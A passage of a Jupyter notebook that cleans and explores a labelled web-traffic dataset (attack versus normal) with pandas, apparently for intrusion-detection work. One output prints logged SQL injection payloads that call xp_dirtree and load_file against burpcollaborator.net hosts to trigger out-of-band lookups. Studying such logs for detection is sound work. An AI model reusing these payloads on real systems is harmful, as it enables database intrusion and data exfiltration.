   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### http_query"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "http_query\n",
       "-                                                                                                                                                                                                                                       12263\n",
       "?org.apache.catalina.filters.CSRF_NONCE=2DB51B70DF17EEE27863DBC19BBBA14A                                                                                                                                                                10044\n",
       "page=1&v_num=111                                                                                                                                                                                                                          400\n",
       "full=true                                                                                                                                                                                                                                  22\n",
       "?part=index&rid=20&bid=notice,talkbox&tid=5&tag=y&hl=0&tsizl=50&pid=                                                                                                                                                                       20\n",
       "                                                                                                                                                                                                                                        ...  \n",
       "page=1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cdj0vyucjeyzq3fwfthtn6xahb8h05rxfo2eq3.burpcollab'%2b'orator.net%5curw'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20&v_num=111|23|800a000d|������_��ġ����_�ʽ��ϴ�.:_'page'         1\n",
       "page=1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5ci5o0kzyo03lvpkikfmfss2wmxd35rwkkb71vq.burpcollab'%2b'orator.net%5cvsa'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20&v_num=111|23|800a000d|������_��ġ����_�ʽ��ϴ�.:_'page'        1\n",
       "page=(select%20load_file('%5c%5c%5c%5c5pvn4mibkq5i9727z9zfcpg9h0nsbjd74uuij.burpcollaborator.net%5c%5cbrt'))&v_num=111|23|800a000d|������_��ġ����_�ʽ��ϴ�.:_'page'                                                                           1\n",
       "page=1'%2b(select%20load_file('%5c%5c%5c%5c6jqoynccerzj38w8tatg6qaab1ht5k88zvpje.burpcollaborator.net%5c%5ccls'))%2b'&v_num=111|23|800a000d|������_��ġ����_�ʽ��ϴ�.:_'page'                                                                  1\n",
       "?boardId=free&boardNo=162980390089131&command=READ&page=1&categoryId=-1                                                                                                                                                                     1\n",
       "Name: count, Length: 663, dtype: int64"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_df[\"http_query\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "web_df[\"http_query\"] = web_df[\"http_query\"].fillna('-')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_df[\"http_query\"].isnull().sum()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### rcvd_bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "rcvd_bytes\n",
       "237.0    42\n",
       "235.0    41\n",
       "240.0    40\n",
       "236.0    40\n",
       "588.0    38\n",
       "         ..\n",
       "677.0     1\n",
       "879.0     1\n",
       "812.0     1\n",
       "580.0     1\n",
       "631.0     1\n",
       "Name: count, Length: 410, dtype: int64"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_df[\"rcvd_bytes\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "web_df[\"rcvd_bytes\"] = web_df[\"rcvd_bytes\"].fillna(0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_df[\"rcvd_bytes\"].isnull().sum()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### sent_bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "sent_bytes\n",
       "332.0      10842\n",
       "521.0        410\n",
       "30447.0      229\n",
       "5573.0        73\n",
       "30446.0       60\n",
       "           ...  \n",
       "681.0          1\n",
       "5578.0         1\n",
       "23604.0        1\n",
       "5600.0         1\n",
       "15478.0        1\n",
       "Name: count, Length: 484, dtype: int64"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_df[\"sent_bytes\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "web_df[\"sent_bytes\"] = web_df[\"sent_bytes\"].fillna(0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_df[\"rcvd_bytes\"].isnull().sum()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 분석"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 40182 entries, 0 to 40181\n",
      "Data columns (total 11 columns):\n",
      " #   Column        Non-Null Count  Dtype  \n",
      "---  ------        --------------  -----  \n",
      " 0   direction     40182 non-null  int64  \n",
      " 1   http_method   40182 non-null  object \n",
      " 2   http_query    40182 non-null  object \n",
      " 3   http_version  40182 non-null  object \n",
      " 4   http_url      40182 non-null  object \n",
      " 5   http_status   40182 non-null  int64  \n",
      " 6   pkt_bytes     40182 non-null  int64  \n",
      " 7   rcvd_bytes    40182 non-null  float64\n",
      " 8   referer       40182 non-null  object \n",
      " 9   sent_bytes    40182 non-null  float64\n",
      " 10  label_attack  40182 non-null  object \n",
      "dtypes: float64(2), int64(3), object(6)\n",
      "memory usage: 3.4+ MB\n"
     ]
    }
   ],
   "source": [
    "web_df.info()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "attack_pkt_bytes = web_df[web_df[\"label_attack\"]==\"attack\"][\"pkt_bytes\"]\n",
    "normal_pkt_bytes = web_df[web_df[\"label_attack\"]==\"normal\"][\"pkt_bytes\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = pd.read_excel(excels_path[2], engine='openpyxl')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'?part=index&rid=20&bid=notice,talkbox&tid=5&tag=y&hl=0&tsizl=50&pid='"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.loc[1][\"http_query\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "rn                                                               11\n",
       "event_time                                      2021-12-08 15:51:56\n",
       "s_ip                                                   192.168.1.30\n",
       "s_port                                                            0\n",
       "s_country                                                         -\n",
       "d_ip                                                    172.16.1.80\n",
       "d_port                                                           80\n",
       "d_country                                                        KR\n",
       "direction                                                         3\n",
       "http_method                                                     GET\n",
       "http_query                                                      NaN\n",
       "http_version                                               HTTP/1.1\n",
       "http_url                                              /favicon.ico \n",
       "http_status                                                     200\n",
       "pkt_bytes                                                       482\n",
       "referer                                    http://172.16.1.80:8080/\n",
       "user_agent        Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...\n",
       "label_attack                                                 normal\n",
       "label_mitre                                                       -\n",
       "label_scenario                                                    -\n",
       "Name: 10, dtype: object"
      ]
     },
     "execution_count": 54,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.loc[10]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
